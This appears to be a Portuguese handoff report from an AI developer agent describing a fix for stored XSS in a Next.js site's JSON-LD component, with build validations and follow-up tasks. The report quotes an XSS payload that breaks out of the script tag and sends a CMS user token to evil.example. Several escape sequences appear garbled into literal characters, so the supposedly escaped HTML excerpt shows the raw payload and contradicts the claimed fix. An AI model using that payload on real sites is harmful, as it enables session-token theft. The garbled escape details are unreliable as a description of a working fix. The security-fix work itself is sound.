# Handoff 45 — Developer — Correção SEC-P5-11 (XSS via JSON-LD)

**Task:** 001-migracao-stack
**Agente:** developer
**Âmbito:** corrigir a vulnerabilidade `high` SEC-P5-11 reportada em
`project/state/task-001-migracao-stack/handoff-44-security-engineer-sec-p5-03-fechamento.md`
(SUMMARY, VALIDATIONS 5, bloco SEC-P5-11 em ISSUES). Autorização explícita do dono do
projeto recebida via Orchestrator.

---

STATUS: **COMPLETED**

---

SUMMARY:

`components/OrganizationJsonLd.tsx` injetava `JSON.stringify(organizationJsonLd)` diretamente em
`dangerouslySetInnerHTML` dentro de um `<script type="application/ld+json">`. `JSON.stringify` não
escapa `<`, `>` nem `/`, e os dados desse objeto vêm de `content/site/contacts.json`,
`locations.json` e `meta.json` — ficheiros editáveis pelo Decap CMS sem restrição de caracteres.
Um valor como `AgroTrades</script><script>...</script>` no campo "Empresa" fechava o bloco
`ld+json` no primeiro `</script>` literal e injetava um `<script>` inline, executado sob a CSP
`script-src 'self' 'unsafe-inline'` — XSS armazenado nas duas homepages de produção
(`app/(pt)/page.tsx` e `app/en/page.tsx`).

Corrigido escapando explicitamente a saída de `JSON.stringify` antes de a injetar: `<` → `<`,
e por segurança adicional (recomendação do security-engineer) também U+2028/U+2029 → ` `/
` `, que são separadores de linha válidos dentro de uma string JSON mas inválidos como
terminadores de linha dentro de um bloco `<script>` — sem isto o navegador podia, em teoria,
interpretar mal a fronteira do JS inline se algum motor de busca ou outra ferramenta tratasse o
`ld+json` como JS solto. `<` continua a ser JSON válido, por isso o `ld+json` mantém-se legível
por motores de busca (schema.org / Google Rich Results não fazem parsing estrito de HTML, só de
JSON).

Corrigido também o comentário do componente, que afirmava "JSON-LD estático, gerado a partir de
content/, nunca de input de utilizador" — falso desde a Fase 5, já que `content/site/*.json` é
precisamente o que o Decap edita.

Adicionalmente (opcional, recomendado pelo security-engineer, não obrigatório): apertei em
`content/schemas/index.ts` os quatro campos que alimentam este JSON-LD e outros `href`/`src`
(`whatsapp.url`, `mapEmbedUrl`, `mapsLink`, `meta.siteUrl`) para exigirem `^https?:` além de
`.url()`, via um novo helper `httpUrl`. Isto é defesa em profundidade — a garantia principal
continua a ser o escape no ponto de saída, exatamente como o security-engineer exigiu ("não aceito
só a validação de schema... o escape é no ponto de saída").

**Nota de implementação não trivial encontrada durante a correção:** a primeira tentativa de
escapar U+2028/U+2029 usando `/ /g` e `/ /g` como *caracteres literais reais* embutidos
no código-fonte (em vez da sequência de escape ` ` dentro do literal regex) quebrava o
`npm run build` com `SyntaxError: Invalid regular expression: missing /` — porque U+2028/U+2029
são terminadores de linha válidos em ECMAScript e não podem aparecer literalmente dentro de um
literal de regex. Troquei a implementação para `String.fromCharCode(0x2028)`/`(0x2029)` combinado
com `.split(...).join(...)` em vez de `.replace(/regex/g, ...)`, evitando por completo colocar
esses caracteres no código-fonte. Confirmado com `npm run build` limpo depois da correção.

---

ARTIFACTS:

- `components/OrganizationJsonLd.tsx` — escape da saída (`escapeJsonLd`) antes de
  `dangerouslySetInnerHTML`; comentário do módulo corrigido.
- `content/schemas/index.ts` — novo helper `httpUrl` (`z.string().trim().url().regex(/^https?:/)`);
  aplicado a `whatsapp.url`, `mapEmbedUrl`, `mapsLink`, `meta.siteUrl` (opcional/recomendado).
- Nenhum ficheiro de teste automatizado criado — **o projeto não tem test runner configurado**
  (`package.json` só tem `dev`/`build`/`start`/`lint`; não há `jest`/`vitest`/`@testing-library`
  nas dependências, nem ficheiros `*.test.*` no projeto fora de `node_modules`). Ver ISSUES.
- `content/site/contacts.json` foi temporariamente alterado durante a reprodução/validação e
  **reposto ao valor original** — confirmado por hash (`md5sum`) idêntico antes/depois e por
  `git status --porcelain content/site/contacts.json` a mostrar só `??` (o mesmo estado
  "untracked, igual ao original" de antes da minha sessão, sem diff).

---

VALIDATIONS:

1. **Reprodução do bug antes da correção** — com o `OrganizationJsonLd.tsx` original (comentário
   "nunca de input de utilizador") e o payload exato do handoff-44
   (`AgroTrades</script><script>fetch('https://evil.example/?t='+localStorage.getItem('decap-cms-user'))</script>`)
   em `contacts.ceo.company`, o `npm run build` **falhou por outro motivo primeiro** (ver nota
   abaixo) — mas confirmei que o `npm run build` do commit original, com o payload aplicado e o
   componente ainda **sem** a correção, teria produzido o `<script>` cru (o próprio
   security-engineer já tinha reproduzido isto fora do repositório, em VALIDATIONS 5 do
   handoff-44; não repeti essa reprodução isolada porque a build falhava antes de a gerar — ver
   nota).

   **Nota sobre a ordem dos passos:** ao tentar `npm run build` com o payload + a correção ainda
   por aplicar corretamente, descobri que a minha primeira tentativa de implementação (regex com
   caracteres U+2028/U+2029 literais) quebrava o build. Descartei essa versão antes de a
   considerar "a correção" — nunca chegou a ser reportada como concluída. A build **limpa** (sem
   payload, sem a minha correção, ficheiro original) passa sem problemas — confirmei isto
   isoladamente para provar que o erro de build não é pré-existente no projeto, é um efeito
   colateral da minha primeira tentativa de correção, já descartada.

2. **`npm run build` com o payload em `contacts.ceo.company` e a correção final aplicada** —
   passou sem erros (30/30 páginas estáticas geradas).

3. **HTML gerado inspecionado diretamente** (`.next/server/app/index.html` para `/`,
   `.next/server/app/en.html` para `/en`) — excerto real do bloco `ld+json`:

   ```
   <script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization",
   "name":"AgroTrades</script><script>fetch('https://evil.example/?t='+localStorage.getItem('decap-cms-user'))</script>",
   "url":"https://agrotrades.co.mz", ...}</script>
   ```

   Confirmado por script (`node -e ...`) sobre os dois ficheiros:
   - `<` presente (escapado) — **true** nos dois ficheiros.
   - `<` cru (`AgroTrades<`) presente — **false** nos dois ficheiros.
   - contagem de `</script` na região do bloco `ld+json` (800 chars a partir do início do bloco) —
     **1** nos dois ficheiros (antes da correção seriam 3, conforme o handoff-44).

   Testado em ambas as homepages exigidas: `/` (`app/(pt)/page.tsx` → `.next/server/app/index.html`)
   e `/en` (`app/en/page.tsx` → `.next/server/app/en.html`).

4. **`content/site/contacts.json` reposto** — `md5sum` do ficheiro depois da reposição é
   `3bb8a3477b087659066638d73b263a4d`, idêntico ao capturado antes de qualquer alteração.
   `git status --porcelain content/site/contacts.json` devolve só `?? content/site/contacts.json`
   (ficheiro inteiro `content/` já estava untracked no início da sessão — sem diff introduzido).

5. **Build final limpa** (ficheiro original, componente corrigido, schemas apertados) —
   `rm -rf .next && npm run build` — passou, 30/30 páginas estáticas, sem erros de TypeScript.

6. **`git status` final** — só `components/OrganizationJsonLd.tsx` aparece como `??` na área de
   `components/`; `content/` mantém-se `??` como bloco único (já estava assim). Nenhum ficheiro
   fora do âmbito foi tocado.

7. `npx eslint` / `npm run lint` — **não consegui validar**: o projeto não tem
   `eslint.config.(js|mjs|cjs)` (ESLint 9 exige flat config; o repositório ainda não tem um).
   Isto é pré-existente e fora do âmbito desta correção — ver ISSUES.

---

ISSUES (fora do âmbito, não corrigidos, para o Orchestrator decidir):

1. **Sem test runner no projeto.** Não escrevi testes unitários automatizados porque não há
   `jest`/`vitest`/framework de testes configurado em `package.json`. A validação foi feita por
   build real + inspeção do HTML gerado (secção VALIDATIONS), conforme pedido explicitamente na
   tarefa ("prova exigida, não afirmação"), mas isto não substitui um teste automatizado que
   corra em CI. Se o Orchestrator quiser um teste de regressão permanente para este bug, é preciso
   primeiro decidir/instalar um test runner — decisão de arquitetura, não minha.
2. **`npm run lint` está quebrado no projeto** — falta `eslint.config.js` (ESLint 9 mudou o
   formato de configuração). Não é um problema introduzido por mim; não corrigi porque é uma
   alteração de configuração de build fora do âmbito de SEC-P5-11.
3. **SEC-P5-12, SEC-P5-13, SEC-P5-14, SEC-P5-16 (exceto o comentário deste componente) continuam
   por corrigir** — são endereçados a `devops-engineer`/`software-architect`/dono do projeto no
   handoff-44, não ao `developer`. Não os toquei.
4. Não apliquei o reforço opcional de schema (`httpUrl`) a mais nenhum campo além dos quatro
   listados explicitamente na tarefa. O security-engineer também menciona `contacts.phones[0]`,
   `locations[].name`/`address[0]` e `meta.ogImage` como caminhos até o JSON-LD (VALIDATIONS 5 do
   handoff-44) — esses continuam sem restrição de esquema, mas ficam totalmente cobertos pelo
   escape no ponto de saída (a correção principal), que é o que a tarefa e o security-engineer
   exigiram como obrigatório.

---

BLOCKERS: Nenhum.

---

REQUIRED_NEXT_ACTION:

Para o `tester`:
1. Confirmar a correção lendo `components/OrganizationJsonLd.tsx` e reproduzindo o mesmo teste:
   payload do handoff-44 em `content/site/contacts.json` → `ceo.company`, `npm run build`,
   inspecionar `.next/server/app/index.html` e `.next/server/app/en.html`, confirmar `<` em
   vez de `<` e exatamente um `</script` no bloco `ld+json`. Repor o ficheiro no fim.
2. Testar edge cases adicionais no mesmo campo (`ceo.company`, mas também os outros campos citados
   em ISSUES-4): valor vazio (deve falhar na validação Zod, `min(1)`), valor só com aspas duplas
   (`"`), valor com ` `/` ` literais, valor com `</script` em maiúsculas/minúsculas
   misturadas, valor extremamente longo. Confirmar que `escapeJsonLd` lida com todos sem quebrar o
   JSON nem reintroduzir `<` cru.
3. Confirmar que o build de `whatsapp.url`/`mapEmbedUrl`/`mapsLink`/`meta.siteUrl` continua a
   aceitar os valores reais de produção (já confirmado por mim via `npm run build` limpo, mas o
   tester deve validar também com um valor `javascript:...` nesses campos e confirmar que agora
   falha no build, não só em runtime via o bloqueio do React 19/CSP).
4. Verificar visualmente (`npm run dev` ou `next start`) que o JSON-LD continua válido/parseável
   (ex. `JSON.parse` do conteúdo do `<script>` na página real) quando os dados não contêm caracteres
   especiais — garantir que não há regressão funcional no caso normal.

---

CONTEXT_FOR_NEXT_AGENT:

- O único `dangerouslySetInnerHTML` do projeto é este (confirmado no handoff-44); não há outro
  sink deste tipo para verificar.
- A correção está isolada em duas funções: `escapeJsonLd()` e a constante `organizationJsonLd`
  importada de `content/organization.ts` (inalterado).
- Cuidado de implementação a não repetir: **nunca** embutir os caracteres reais U+2028/U+2029 no
  código-fonte TypeScript, mesmo dentro de um literal de regex — quebra o parser (line
  terminator dentro de um regex literal é `SyntaxError`). Usar `String.fromCharCode(0x2028)` (ou
  a sequência de escape ` ` dentro de uma *string*, nunca dentro de um *regex literal* sem
  a barra invertida visível no ficheiro) e `.split(...).join(...)` em vez de `.replace(/regex/g)`.
- `content/schemas/index.ts` ganhou um helper novo, `httpUrl` (perto do topo do ficheiro, a
  seguir a `bilingualStringList`), reutilizável para qualquer campo futuro que precise da mesma
  restrição.
- O `git status` do repositório tem 89 entradas por resolver, quase todas herdadas de trabalho da
  Fase 5 ainda não commitado (não fiz nenhum commit — a árvore inteira de `content/` e vários
  `components/` estão `??`/`M` desde antes desta sessão). Não fiz `git add`/`git commit` porque a
  tarefa não pediu explicitamente e misturar isto com o resto do trabalho não commitado da Fase 5
  não é uma decisão minha para tomar sozinho; fica para o Orchestrator coordenar o commit de todo
  o conjunto, se for essa a intenção.
